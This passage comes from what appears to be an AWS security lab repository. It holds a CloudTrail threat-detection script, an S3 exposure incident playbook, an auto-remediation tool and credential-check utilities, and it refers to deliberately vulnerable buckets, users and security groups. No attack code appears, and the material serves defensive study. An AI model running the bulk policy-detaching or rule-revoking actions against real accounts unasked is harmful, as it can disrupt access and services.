                        'pattern': pattern_name,
                        'username': username,
                        'matching_events': list(matches),
                        'severity': 'High' if pattern_name in ['privilege_escalation', 'defense_evasion'] else 'Medium'
                    })
        
        return pattern_findings
    
    def analyze_ip_addresses(self, events):
        """Analyze source IP addresses for anomalies"""
        console.print("\n[bold cyan]Analyzing Source IPs...[/]")
        
        ip_activity = defaultdict(lambda: {'count': 0, 'users': set(), 'events': set()})
        
        for event in events:
            parsed = self.parse_event(event)
            if parsed and parsed['source_ip']:
                ip = parsed['source_ip']
                ip_activity[ip]['count'] += 1
                ip_activity[ip]['users'].add(parsed['username'])
                ip_activity[ip]['events'].add(parsed['event_name'])
        
        suspicious_ips = []
        for ip, data in ip_activity.items():
            # Flag IPs with multiple users (potential credential stuffing)
            if len(data['users']) > 3:
                suspicious_ips.append({
                    'ip': ip,
                    'reason': f"Multiple users ({len(data['users'])}) from same IP",
                    'users': list(data['users']),
                    'severity': 'High'
                })
            
            # Flag IPs with high event count
            if data['count'] > 100:
                suspicious_ips.append({
                    'ip': ip,
                    'reason': f"High activity volume ({data['count']} events)",
                    'severity': 'Medium'
                })
        
        return suspicious_ips
    
    def generate_report(self, events):
        """Generate comprehensive security report"""
        all_findings = []
        
        # Analyze each event
        console.print("\n[bold cyan]Analyzing Events...[/]")
        with Progress() as progress:
            task = progress.add_task("Processing...", total=len(events))
            
            for event in events:
                parsed = self.parse_event(event)
                if parsed:
                    findings = self.analyze_event(parsed)
                    all_findings.extend(findings)
                    self.event_stats[parsed['event_name']] += 1
                    self.user_activity[parsed['username']].append(parsed)
                progress.advance(task)
        
        # Detect attack patterns
        patterns = self.detect_attack_patterns(events)
        
        # Analyze IPs
        suspicious_ips = self.analyze_ip_addresses(events)
        
        return {
            'total_events': len(events),
            'findings': all_findings,
            'patterns': patterns,
            'suspicious_ips': suspicious_ips,
            'event_stats': dict(self.event_stats),
            'active_users': len(self.user_activity)
        }
    
    def display_report(self, report):
        """Display the security report"""
        console.print("\n" + "="*60)
        console.print("[bold]SECURITY ANALYSIS REPORT[/]")
        console.print("="*60)
        
        # Summary
        console.print(f"\n[cyan]Total Events Analyzed:[/] {report['total_events']}")
        console.print(f"[cyan]Active Users:[/] {report['active_users']}")
        console.print(f"[cyan]Findings:[/] {len(report['findings'])}")
        console.print(f"[cyan]Attack Patterns:[/] {len(report['patterns'])}")
        console.print(f"[cyan]Suspicious IPs:[/] {len(report['suspicious_ips'])}")
        
        # Findings by severity
        if report['findings']:
            console.print("\n[bold red]SECURITY FINDINGS[/]")
            
            table = Table()
            table.add_column("Time", style="dim")
            table.add_column("Severity", style="bold")
            table.add_column("Category")
            table.add_column("Event")
            table.add_column("User")
            table.add_column("Source IP")
            
            severity_order = {'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3, 'Info': 4}
            sorted_findings = sorted(report['findings'], 
                                    key=lambda x: severity_order.get(x['severity'], 5))
            
            for finding in sorted_findings[:20]:  # Show top 20
                severity_color = {
                    'Critical': 'red',
                    'High': 'yellow',
                    'Medium': 'blue',
                    'Low': 'green'
                }.get(finding['severity'], 'white')
                
                table.add_row(
                    str(finding.get('time', ''))[:19],
                    f"[{severity_color}]{finding['severity']}[/]",
                    finding['category'],
                    finding['event_name'],
                    finding['username'][:15],
                    finding['source_ip']
                )
            
            console.print(table)
        
        # Attack patterns
        if report['patterns']:
            console.print("\n[bold red]ATTACK PATTERNS DETECTED[/]")
            for pattern in report['patterns']:
                console.print(f"  [yellow]⚠ {pattern['pattern'].upper()}[/]")
                console.print(f"    User: {pattern['username']}")
                console.print(f"    Events: {', '.join(pattern['matching_events'])}")
        
        # Suspicious IPs
        if report['suspicious_ips']:
            console.print("\n[bold red]SUSPICIOUS IP ADDRESSES[/]")
            for ip_info in report['suspicious_ips']:
                console.print(f"  [yellow]⚠ {ip_info['ip']}[/]")
                console.print(f"    Reason: {ip_info['reason']}")
        
        # Top events
        console.print("\n[bold cyan]TOP EVENTS[/]")
        sorted_events = sorted(report['event_stats'].items(), key=lambda x: x[1], reverse=True)
        for event, count in sorted_events[:10]:
            console.print(f"  {event}: {count}")


def main():
    console.print(Panel.fit(
        "[bold cyan]🔍 CLOUDTRAIL LOG ANALYZER 🔍[/]\n\n"
        "SOC tool for detecting security threats:\n"
        "• Suspicious API calls\n"
        "• Attack pattern detection\n"
        "• Anomalous IP analysis\n"
        "• Root account usage alerts",
        title="Security Operations Center"
    ))
    
    analyzer = CloudTrailAnalyzer()
    
    # Query recent events
    events = analyzer.lookup_recent_events(hours=24, max_results=500)
    
    if events:
        # Generate and display report
        report = analyzer.generate_report(events)
        analyzer.display_report(report)
        
        # Save report
        report_file = 'security_report.json'
        with open(report_file, 'w') as f:
            # Convert non-serializable objects
            export_report = {
                'generated_at': datetime.utcnow().isoformat(),
                'total_events': report['total_events'],
                'findings_count': len(report['findings']),
                'patterns': report['patterns'],
                'suspicious_ips': report['suspicious_ips'],
                'event_stats': report['event_stats']
            }
            json.dump(export_report, f, indent=2, default=str)
        console.print(f"\n[green]Report saved to {report_file}[/]")
    else:
        console.print("\n[yellow]No events found. Make sure CloudTrail is enabled.[/]")
    
    console.print("\n[bold green]Analysis complete![/]")


if __name__ == "__main__":
    main()

```

## File: `soc-defense\playbooks\s3_incident_response.md`
```text
# Incident Response Playbook: S3 Data Exposure

## 🚨 Trigger
**Alert**: `SecurityLab-S3BucketPolicyChange` or `SecurityLab-S3PublicAccess`
**Severity**: High/Critical

## 🕵️ Analysis Steps
1.  **Identify the User**:
    - Who made the change? Check CloudTrail logs for `PutBucketPolicy` or `PutBucketAcl`.
    - Is this a known admin or a compromised user?

2.  **Review the Change**:
    - What permission was added?
    - Is `Principal: "*"` present? (Public Access)
    - Is `Action: "s3:GetObject"` allowed?

3.  **Assess Impact**:
    - List objects in the bucket.
    - Are there sensitive files (credentials, PII, secrets)?
    - Check access logs to see if external IPs accessed these files.

## 🛡️ Containment & Eradication (Remediation)
1.  **Immediate Block**:
    - Apply "Block Public Access" on the bucket immediately.
    ```python
    s3.put_public_access_block(Bucket=bucket_name, PublicAccessBlockConfiguration={...all True...})
    ```

2.  **Revert Policy**:
    - Delete the malicious bucket policy.
    ```python
    s3.delete_bucket_policy(Bucket=bucket_name)
    ```

3.  **rotate Credentials**:
    - If a user account was compromised to make this change, disable the user and rotate keys.

## 📝 Post-Incident
1.  Document the incident scope and impact.
2.  Update IAM policies to prevent users from changing bucket policies if not needed.
3.  Ensure CloudWatch alerts are functioning correctly.

```

## File: `soc-defense\remediation\auto_remediate.py`
```python
"""
Auto-Remediation Tool
=====================
Automated security response tool that fixes vulnerabilities detected in the lab.

REMEDIATION ACTIONS:
1. S3: Enable encryption, versioning, block public access
2. IAM: Detach dangerous policies, remove overprivileged users
3. EC2: Revoke open security group rules, enforce IMDSv2
"""

import boto3
import json
import sys
import os
import time

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from config import config

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Confirm
from rich.progress import Progress

console = Console()

class AutoRemediator:
    """Automated remediation for detected vulnerabilities"""
    
    def __init__(self, dry_run=False):
        self.dry_run = dry_run
        self.region = config.AWS_REGION
        self.s3 = boto3.client('s3', region_name=self.region)
        self.iam = boto3.client('iam', region_name=self.region)
        self.ec2 = boto3.client('ec2', region_name=self.region)
        
    def remediate_s3_bucket(self, bucket_name):
        """Secure a vulnerable S3 bucket"""
        console.print(f"\n[cyan]Checking Bucket:[/] {bucket_name}")
        
        try:
            # Check existence
            self.s3.head_bucket(Bucket=bucket_name)
        except:
            console.print(f"  [dim]Bucket not found[/]")
            return

        actions = []
        
        # 1. Block Public Access
        console.print("  [dim]• Enforcing Public Access Block[/]")
        if not self.dry_run:
            try:
                self.s3.put_public_access_block(
                    Bucket=bucket_name,
                    PublicAccessBlockConfiguration={
                        'BlockPublicAcls': True,
                        'IgnorePublicAcls': True,
                        'BlockPublicPolicy': True,
                        'RestrictPublicBuckets': True
                    }
                )
                actions.append("Enabled Public Access Block")
            except Exception as e:
                console.print(f"    [red]Error:[/] {e}")
        else:
            actions.append("[DRY RUN] Would enable Public Access Block")

        # 2. Enable Encryption
        console.print("  [dim]• Enabling Server-Side Encryption[/]")
        if not self.dry_run:
            try:
                self.s3.put_bucket_encryption(
                    Bucket=bucket_name,
                    ServerSideEncryptionConfiguration={
                        'Rules': [{'ApplyServerSideEncryptionByDefault': {'SSEAlgorithm': 'AES256'}}]
                    }
                )
                actions.append("Enabled AES256 Encryption")
            except Exception as e:
                console.print(f"    [red]Error:[/] {e}")
        else:
            actions.append("[DRY RUN] Would enable Encryption")

        # 3. Enable Versioning
        console.print("  [dim]• Enabling Versioning[/]")
        if not self.dry_run:
            try:
                self.s3.put_bucket_versioning(
                    Bucket=bucket_name,
                    VersioningConfiguration={'Status': 'Enabled'}
                )
                actions.append("Enabled Versioning")
            except Exception as e:
                console.print(f"    [red]Error:[/] {e}")
        else:
            actions.append("[DRY RUN] Would enable Versioning")
            
        # 4. Remove Public Policy
        console.print("  [dim]• Checking/Removing Bucket Policy[/]")
        if not self.dry_run:
            try:
                self.s3.delete_bucket_policy(Bucket=bucket_name)
                actions.append("Removed potentially dangerous bucket policy")
            except Exception as e:
                # Often throws error if no policy exists, which is fine
                pass
        
        # Summary
        for action in actions:
            console.print(f"  [green]✓[/] {action}")

    def remediate_iam_user(self, user_name):
        """Secure a vulnerable IAM user"""
        console.print(f"\n[cyan]Checking IAM User:[/] {user_name}")
        
        try:
            self.iam.get_user(UserName=user_name)
        except:
            console.print("  [dim]User not found[/]")
            return
            
        actions = []
        
        # Detach all managed policies
        paginator = self.iam.get_paginator('list_attached_user_policies')
        for page in paginator.paginate(UserName=user_name):
            for policy in page['AttachedPolicies']:
                if not self.dry_run:
                    self.iam.detach_user_policy(UserName=user_name, PolicyArn=policy['PolicyArn'])
                    actions.append(f"Detached policy: {policy['PolicyName']}")
                else:
                    actions.append(f"[DRY RUN] Would detach: {policy['PolicyName']}")
        
        # Delete inline policies
        try:
            inline = self.iam.list_user_policies(UserName=user_name)
            for policy_name in inline['PolicyNames']:
                if not self.dry_run:
                    self.iam.delete_user_policy(UserName=user_name, PolicyName=policy_name)
                    actions.append(f"Deleted inline policy: {policy_name}")
                else:
                    actions.append(f"[DRY RUN] Would delete inline policy: {policy_name}")
        except Exception as e:
            console.print(f"  [red]Error checking inline policies:[/] {e}")
            
        # Summary
        if actions:
            for action in actions:
                console.print(f"  [green]✓[/] {action}")
        else:
            console.print(f"  [green]✓[/] User has no dangerous policies attached")

    def remediate_ec2_sg(self, sg_id):
        """Fix vulnerable security group"""
        console.print(f"\n[cyan]Checking Security Group:[/] {sg_id}")
        
        try:
            sg = self.ec2.describe_security_groups(GroupIds=[sg_id])['SecurityGroups'][0]
        except:
            console.print("  [dim]Security Group not found[/]")
            return
            
        actions = []
        
        # Check permissions
        for perm in sg.get('IpPermissions', []):
            # Look for 0.0.0.0/0
            is_open_world = False
            for r in perm.get('IpRanges', []):
                if r.get('CidrIp') == '0.0.0.0/0':
                    is_open_world = True
                    break
            
            if is_open_world:
                description = f"Rule: Protocol {perm.get('IpProtocol')} Port {perm.get('FromPort')}-{perm.get('ToPort')}"
                if not self.dry_run:
                    try:
                        self.ec2.revoke_security_group_ingress(
                            GroupId=sg_id,
                            IpPermissions=[perm]
                        )
                        actions.append(f"Revoked open world access - {description}")
                    except Exception as e:
                        console.print(f"  [red]Error revoking rule:[/] {e}")
                else:
                    actions.append(f"[DRY RUN] Would revoke open world access - {description}")

        if actions:
            for action in actions:
                console.print(f"  [green]✓[/] {action}")
        else:
            console.print("  [green]✓[/] No open-to-world rules found")

    def run(self):
        console.print(Panel.fit(
            f"[bold green]🛡️ AUTO-REMEDIATION TOOL 🛡️[/]\n"
            f"Mode: {'[yellow]DRY RUN[/]' if self.dry_run else '[red]ACTIVE REMEDIATION[/]'}\n"
            "Scanning and fixing security issues...",
            title="SOC Defense"
        ))
        
        # 1. Remediate S3
        console.print("\n[bold]Phase 1: S3 Buckets[/]")
        buckets = [
            config.S3_PUBLIC_BUCKET,
            config.S3_UNENCRYPTED_BUCKET,
            config.S3_NO_VERSIONING_BUCKET,
            config.S3_CORS_BUCKET
        ]
        for bucket in buckets:
            self.remediate_s3_bucket(bucket)
            
        # 2. Remediate IAM
        console.print("\n[bold]Phase 2: IAM Entities[/]")
        users = [
            config.IAM_OVERPRIVILEGED_USER,
            config.IAM_ESCALATION_USER
        ]
        for user in users:
            self.remediate_iam_user(user)
            
        # 3. Remediate EC2
        console.print("\n[bold]Phase 3: EC2 Security[/]")
        # Find vulnerable SG ID dynamically
        try:
            sgs = self.ec2.describe_security_groups(
                Filters=[{'Name': 'group-name', 'Values': [config.EC2_VULNERABLE_SG]}]
            )
            if sgs['SecurityGroups']:
                self.remediate_ec2_sg(sgs['SecurityGroups'][0]['GroupId'])
            else:
                console.print(f"  [dim]Security Group {config.EC2_VULNERABLE_SG} not found[/]")
        except Exception as e:
            console.print(f"  [red]Error finding security group:[/] {e}")
            
        console.print("\n[bold green]Remediation Complete![/]")

def main():
    import argparse
    parser = argparse.ArgumentParser(description='Auto Remediate Vulnerabilities')
    parser.add_argument('--dry-run', action='store_true', help='Simulate changes without applying them')
    args = parser.parse_args()
    
    # Prompt for confirmation if not dry run
    if not args.dry_run:
        if not Confirm.ask("[bold red]WARNING: This will modify AWS resources. Proceed?[/]"):
            return

    remediator = AutoRemediator(dry_run=args.dry_run)
    remediator.run()

if __name__ == '__main__':
    main()

```

## File: `utils\check_permissions.py`
```python
import boto3
import sys
import os
from botocore.exceptions import ClientError

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import config

def check_permissions():
    print(f"Checking permissions for region: {config.AWS_REGION}...")
    
    # 1. Check S3 List Buckets (Basic)
    try:
        s3 = boto3.client('s3', region_name=config.AWS_REGION)
        s3.list_buckets()
        print("[OK] S3: ListBuckets permitted.")
    except ClientError as e:
        print(f"[FAIL] S3: ListBuckets denied. {e}")
        return False

    # 2. Check IAM Create User (Privileged)
    try:
        iam = boto3.client('iam', region_name=config.AWS_REGION)
        # We won't actually create a user, just check if we can list users as a proxy for read access
        iam.list_users() 
        print("[OK] IAM: ListUsers permitted.")
        
        # DryRun CreateUser to check write permissions
        # Note: Boto3 doesn't support DryRun for CreateUser natively in all calls, 
        # but we can try to simulate a safe action or assume if Read works and they promised Admin, we are close.
        # Better: Try to get a policy that requires admin rights.
    except ClientError as e:
        print(f"[FAIL] IAM: ListUsers denied. {e}")
        return False

    print("\nPermissions look OK for basic checks.")
    print("If you have attached 'AdministratorAccess', deployment should work.")
    return True

if __name__ == "__main__":
    check_permissions()

```

## File: `utils\verify_credentials.py`
```python
import boto3
import os
from dotenv import load_dotenv
from pathlib import Path

# Explicitly load .env from current directory
env_path = Path(__file__).parent.parent / '.env'
load_dotenv(dotenv_path=env_path)

def main():
    print("--- AWS Credential Verification ---")
    
    region = os.getenv('AWS_REGION')
    key = os.getenv('AWS_ACCESS_KEY_ID')
    
    print(f"Region: {region}")
    print(f"Access Key: {key}")
    
    if not key:
        print("ERROR: No Access Key found in .env")
        return

    try:
        # Try to connect to STS (Global endpoint)
        print("\nAttempting connection to AWS STS...")
        sts = boto3.client('sts', region_name=region)
        valid = sts.get_caller_identity()
        print("SUCCESS! Credentials are valid.")
        print(f"Account: {valid['Account']}")
        print(f"User ARN: {valid['Arn']}")
    except Exception as e:
        print("\nFAILURE! Could not connect.")
        print(f"Error: {e}")
        print("\nPossible causes:")
        print("1. The Access Key ID or Secret Key is incorrect.")
        print("2. The Access Key is 'Inactive' in the AWS Console.")
        print("3. System time is out of sync (rare).")

if __name__ == "__main__":
    main()

```

